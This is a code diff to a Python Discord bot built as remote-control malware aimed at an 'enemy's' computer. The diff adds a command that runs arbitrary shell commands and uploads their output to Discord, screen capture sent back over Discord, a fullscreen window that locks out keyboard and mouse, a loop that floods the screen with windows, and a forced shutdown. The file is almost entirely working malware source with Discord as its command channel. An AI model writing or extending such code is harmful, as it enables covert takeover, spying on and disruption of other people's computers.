@@ -7,13 +7,16 @@ import platform
 import psutil
 import os
 import logging
+import asyncio
+import subprocess
+import pyautogui
+import io
 
 
 intents = discord.Intents.all()
 
 
 bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
-
 
 logging.basicConfig(level=logging.CRITICAL)
 
@@ -68,6 +71,7 @@ async def message(ctx, *, message):
 async def redirect(ctx, *, website):
     """Redirects enemys computer to another website"""
     try:
+
         if not website.startswith('http://') and not website.startswith('https://'):
             await ctx.send("Please include 'http://' or 'https://' in the URL.")
             return
@@ -75,7 +79,6 @@ async def redirect(ctx, *, website):
         await ctx.send(f"Redirecting to {website}")
     except Exception as e:
         await ctx.send(f"Error redirecting to {website}: {e}")
-
 
 @bot.command()
 async def info(ctx):
@@ -190,19 +193,163 @@ async def rename(ctx, number: int, new_name: str):
     else:
         await ctx.send("Invalid file number.")
 
+
 @bot.command()
 async def help(ctx):
     """Shows this message"""
     help_message = "This is a list of available commands and their descriptions:\n\n"
     for command in bot.commands:
         if command.help:  
-            help_message += f"**{command.name}**: {command.help}\n"
+            help_message += f"**!{command.name}**: {command.help}\n"
         else:
-            help_message += f"**{command.name}**: No description available\n"
+            help_message += f"**!{command.name}**: No description available\n"
 
     await ctx.send(help_message)
 
 
+
+nuke_task = None
+
+
+def display_window():
+    root = tk.Tk()
+    root.title("Nuke")
+    label = tk.Label(root, text="Nuke is activated!")
+    label.pack()
+    root.mainloop()
+
+
+@bot.command()
+async def nuke(ctx):
+    """Opens window until you type again !nuke"""
+    global nuke_task
+    if nuke_task and not nuke_task.done():
+        nuke_task.cancel()
+        await ctx.send("Nuke deactivated!")
+        nuke_task = None
+    else:
+        await ctx.send("Nuke activated! Windows will be opened every second until you type !nuke again.")
+        nuke_task = bot.loop.create_task(run_nuke())
+
+
+async def run_nuke():
+    while True:
+        display_window()
+        await asyncio.sleep(0.1)  
+
+
+@bot.command()
+async def shell(ctx, *, command):
+    """Run a command in you enemys terminal"""
+    try:
+ 
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+
+     
+        with open('output.txt', 'w') as f:
+            f.write(f"Command: {command}\n")
+            f.write(f"Output:\n{result.stdout}\n")
+            f.write(f"Error:\n{result.stderr}\n")
+
+        await ctx.send(file=discord.File('output.txt'))
+
+
+        subprocess.run('rm output.txt', shell=True)
+
+    except Exception as e:
+        await ctx.send(f"Error executing command: {e}")
+
+
+blocking_window = None
+reopen_window = True
+
+
+async def block_window():
+    global blocking_window, reopen_window
+    while reopen_window:
+        blocking_window = tk.Tk()
+        blocking_window.attributes('-fullscreen', True)  
+        blocking_window.after(1000, lambda: destroy_window(blocking_window))  
+        blocking_window.mainloop()
+        await asyncio.sleep(0.1)  
+
+
+def destroy_window(window):
+    if window:
+        try:
+            window.destroy()
+        except tk.TclError:
+            pass
+
+
+@bot.command()
+async def block(ctx):
+    """Blocks you enemys keyboard and mouse"""
+    global blocking_window, reopen_window
+    if not blocking_window:
+        await ctx.send("Blocking window opened.")
+        await block_window()
+    else:
+        destroy_window(blocking_window)
+        blocking_window = None
+        if reopen_window:
+            reopen_window = False
+            await ctx.send("Blocking window closed.")
+        else:
+            reopen_window = True
+            await ctx.send("Blocking window restarted.")
+
+
+@bot.command()
+async def unblock(ctx):
+    """Unblocks you enemys Keyboard and Mouse"""
+    global reopen_window
+    reopen_window = False
+    await ctx.send("Blocking window stopped.")
+
+@bot.command()
+async def invite(ctx):
+    """Invite link for the bot"""
+    await ctx.send(f"[Invite link](<https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=34816&scope=bot>)")
+
+@bot.command()
+async def stop(ctx):
+    """Stops the bot"""
+    await ctx.send("Stopping the bot...")
+    await bot.close()
+
+
+@bot.command()
+async def create(ctx, file_name: str):
+    """Create file"""
+    file_path = f"{file_name}"
+    if os.path.exists(file_path):
+        await ctx.send(f"A file with the name '{file_name}' already exists.")
+    else:
+        with open(file_path, 'w'):
+            pass  
+        await ctx.send(f"File '{file_name}' created successfully.")
+
+@bot.command()
+async def screenshot(ctx):
+    """Makes a screenshot"""
+
+    screenshot = pyautogui.screenshot()
+
+
+    with io.BytesIO() as image_binary:
+        screenshot.save(image_binary, format='PNG')
+        image_binary.seek(0)
+        file = discord.File(fp=image_binary, filename="screenshot.png")
+
+
+        await ctx.send(file=file)
+
+
+@bot.command()
+async def shutdown(ctx):
+    await ctx.send("Shutting down the PC...")
+    os.system("shutdown /s /t 1")  
 
 
 bot.run(os.environ['TOKEN'])
